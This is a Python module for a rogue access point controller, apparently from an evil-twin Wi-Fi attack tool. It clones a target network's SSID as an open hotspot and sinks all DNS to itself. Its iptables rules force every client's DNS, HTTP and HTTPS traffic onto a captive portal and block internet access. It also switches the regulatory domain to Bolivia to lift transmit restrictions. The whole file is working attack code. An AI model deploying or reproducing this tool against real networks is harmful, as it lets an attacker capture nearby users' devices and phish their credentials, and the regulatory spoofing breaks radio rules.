"""
Rogue AP controller.
Manages hostapd (open AP cloning target SSID) + dnsmasq (DHCP + DNS sink)
+ iptables rules to redirect all client traffic to the captive portal.

Key design decisions:
  - NM is told to unmanage ONLY the AP interface (not killed globally).
  - IP forwarding is saved and restored so the host's own networking is preserved.
  - REDIRECT (not DNAT) is used for port 80/443 so it works even when the
    client's request is already addressed to 192.168.87.1.
  - DNS queries to external resolvers are also redirected to our dnsmasq.
  - FORWARD from the AP interface is DROPped — clients get no internet,
    which triggers captive-portal detection on phones/laptops.
"""

import os
import subprocess
import tempfile
import time

from config.settings import (
    DHCP_LEASE_FILE, DHCP_RANGE_END, DHCP_RANGE_START, PORTAL_IP, PORTAL_PORT,
)

_HOSTAPD_CONF = """\
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
country_code={country}
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
{band_extras}"""

# Regulatory domain used while the tool is running.
# BO (Bolivia) has virtually no NO-IR restrictions and allows AP mode
# on all 2.4 and 5 GHz channels. We restore the original domain on exit.
_REG_COUNTRY = 'BO'


def _band_params(channel: int) -> tuple[str, str]:
    """Return (hw_mode, extra_lines) based on channel number.

    Channels 1-13  → 2.4 GHz  hw_mode=g
    Channels 36+   → 5 GHz    hw_mode=a  (add ieee80211ac=1)
    """
    if channel > 14:
        return 'a', 'ieee80211ac=1\n'
    return 'g', ''

_DNSMASQ_CONF = """\
interface={interface}
bind-interfaces
dhcp-range={start},{end},12h
dhcp-option=3,{gw}
dhcp-option=6,{gw}
dhcp-leasefile={lease_file}
no-resolv
no-hosts
bogus-priv
address=/#/{gw}
log-dhcp
"""


def _run(*args) -> None:
    subprocess.run(list(args), check=False, capture_output=True)


class APController:
    def __init__(self, interface: str):
        self.interface = interface
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._hostapd_conf_path = None
        self._dnsmasq_conf_path = None
        self._hostapd_log_path: str | None = None
        self._saved_ip_forward: str | None = None
        self._saved_reg_domain: str | None = None

    # ------------------------------------------------------------------ #
    # Public API

    def start(self, ssid: str, channel: int = 6) -> None:
        self._save_ip_forward()
        self._enable_ip_forward()
        self._save_reg_domain()
        self._set_reg_domain(_REG_COUNTRY)   # lift NO-IR restrictions before hostapd
        self._nm_unmanage(self.interface)
        self._kill_wpa_for(self.interface)
        self._configure_interface()
        self._start_hostapd(ssid, channel)
        time.sleep(2)
        self._start_dnsmasq()
        self._apply_iptables()

    def stop(self) -> None:
        self._remove_iptables()
        for proc in (self._dnsmasq_proc, self._hostapd_proc):
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        for path in (self._dnsmasq_conf_path, self._hostapd_conf_path, self._hostapd_log_path):
            if path and os.path.exists(path):
                try:
                    os.unlink(path)
                except OSError:
                    pass
        self._restore_interface()
        self._nm_manage(self.interface)
        self._restore_reg_domain()
        self._restore_ip_forward()

    # ------------------------------------------------------------------ #
    # Interface management

    def _configure_interface(self) -> None:
        _run('ip', 'link', 'set', self.interface, 'down')
        _run('iwconfig', self.interface, 'mode', 'managed')
        _run('ip', 'addr', 'flush', 'dev', self.interface)
        _run('ip', 'addr', 'add', f'{PORTAL_IP}/24', 'dev', self.interface)
        _run('ip', 'link', 'set', self.interface, 'up')

    def _restore_interface(self) -> None:
        _run('ip', 'addr', 'flush', 'dev', self.interface)
        _run('ip', 'link', 'set', self.interface, 'down')
        _run('iwconfig', self.interface, 'mode', 'managed')
        _run('ip', 'link', 'set', self.interface, 'up')

    # ------------------------------------------------------------------ #
    # NetworkManager

    @staticmethod
    def _nm_unmanage(iface: str) -> None:
        _run('nmcli', 'device', 'set', iface, 'managed', 'no')

    @staticmethod
    def _nm_manage(iface: str) -> None:
        _run('nmcli', 'device', 'set', iface, 'managed', 'yes')
        # NM reconnects to saved networks automatically after a short delay
        _run('systemctl', 'restart', 'NetworkManager')

    @staticmethod
    def _kill_wpa_for(iface: str) -> None:
        _run('pkill', '-f', f'wpa_supplicant.*{iface}')

    # ------------------------------------------------------------------ #
    # hostapd

    def _start_hostapd(self, ssid: str, channel: int) -> None:
        hw_mode, band_extras = _band_params(channel)
        conf = _HOSTAPD_CONF.format(
            interface=self.interface,
            ssid=ssid,
            channel=channel,
            hw_mode=hw_mode,
            country=_REG_COUNTRY,
            band_extras=band_extras,
        )
        fd, self._hostapd_conf_path = tempfile.mkstemp(
            suffix='.conf', prefix='evil_hostapd_',
        )
        with os.fdopen(fd, 'w') as f:
            f.write(conf)

        # Write hostapd output to a temp log so we can read errors if it dies.
        lfd, self._hostapd_log_path = tempfile.mkstemp(
            suffix='.log', prefix='evil_hostapd_',
        )
        self._hostapd_proc = subprocess.Popen(
            ['hostapd', self._hostapd_conf_path],
            stdout=os.fdopen(lfd, 'w'),
            stderr=subprocess.STDOUT,
        )

    def last_hostapd_error(self) -> str:
        """Return the last 15 lines of the hostapd log for diagnostics."""
        if not self._hostapd_log_path or not os.path.exists(self._hostapd_log_path):
            return ''
        try:
            with open(self._hostapd_log_path) as f:
                lines = f.readlines()
            return ''.join(lines[-15:]).strip()
        except OSError:
            return ''

    # ------------------------------------------------------------------ #
    # dnsmasq

    def _start_dnsmasq(self) -> None:
        conf = _DNSMASQ_CONF.format(
            interface=self.interface,
            start=DHCP_RANGE_START,
            end=DHCP_RANGE_END,
            gw=PORTAL_IP,
            lease_file=DHCP_LEASE_FILE,
        )
        fd, self._dnsmasq_conf_path = tempfile.mkstemp(
            suffix='.conf', prefix='evil_dnsmasq_',
        )
        with os.fdopen(fd, 'w') as f:
            f.write(conf)
        _run('pkill', '-f', 'evil_dnsmasq_')
        self._dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '--no-daemon', '-C', self._dnsmasq_conf_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    # ------------------------------------------------------------------ #
    # iptables

    def _apply_iptables(self) -> None:
        iface = self.interface
        port = str(PORTAL_PORT)

        rules = [
            # Accept DHCP from clients
            ['iptables', '-A', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '67', '-j', 'ACCEPT'],
            # Accept DNS from clients (already redirected to us below)
            ['iptables', '-A', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'],
            ['iptables', '-A', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'],
            # Accept HTTP to portal
            ['iptables', '-A', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', port, '-j', 'ACCEPT'],

            # Force ALL DNS (even hardcoded 8.8.8.8) through our dnsmasq
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
             '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-port', '53'],
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-port', '53'],

            # Redirect HTTP to portal (catches hardcoded-IP requests that bypass DNS)
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', port],
            # Redirect HTTPS to portal over plain HTTP (no cert needed)
            ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', port],

            # Block all forwarding — clients get no internet, triggers captive-portal detection
            ['iptables', '-A', 'FORWARD', '-i', iface, '-j', 'DROP'],
        ]
        for cmd in rules:
            subprocess.run(cmd, check=False, capture_output=True)

    def _remove_iptables(self) -> None:
        iface = self.interface
        port = str(PORTAL_PORT)

        rules = [
            ['iptables', '-D', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '67', '-j', 'ACCEPT'],
            ['iptables', '-D', 'INPUT', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'],
            ['iptables', '-D', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'],
            ['iptables', '-D', 'INPUT', '-i', iface, '-p', 'tcp', '--dport', port, '-j', 'ACCEPT'],

            ['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
             '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-port', '53'],
            ['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-port', '53'],
            ['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', port],
            ['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface,
             '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', port],

            ['iptables', '-D', 'FORWARD', '-i', iface, '-j', 'DROP'],
        ]
        for cmd in rules:
            subprocess.run(cmd, check=False, capture_output=True)

    # ------------------------------------------------------------------ #
    # Regulatory domain

    def _save_reg_domain(self) -> None:
        try:
            out = subprocess.run(
                ['iw', 'reg', 'get'], capture_output=True, text=True,
            ).stdout
            for line in out.splitlines():
                # Line format:  "country US: DFS-FCC"  or  "global"
                if line.startswith('country '):
                    self._saved_reg_domain = line.split()[1].rstrip(':')
                    return
        except Exception:
            pass
        self._saved_reg_domain = 'US'

    def _set_reg_domain(self, country: str) -> None:
        subprocess.run(['iw', 'reg', 'set', country], check=False, capture_output=True)
        time.sleep(0.5)   # give the kernel a moment to apply the new domain

    def _restore_reg_domain(self) -> None:
        if self._saved_reg_domain:
            subprocess.run(
                ['iw', 'reg', 'set', self._saved_reg_domain],
                check=False, capture_output=True,
            )

    # ------------------------------------------------------------------ #
    # IP forwarding

    def _save_ip_forward(self) -> None:
        try:
            with open('/proc/sys/net/ipv4/ip_forward') as f:
                self._saved_ip_forward = f.read().strip()
        except OSError:
            self._saved_ip_forward = '0'

    def _enable_ip_forward(self) -> None:
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
        except OSError:
            pass

    def _restore_ip_forward(self) -> None:
        if self._saved_ip_forward is not None:
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(self._saved_ip_forward + '\n')
            except OSError:
                pass
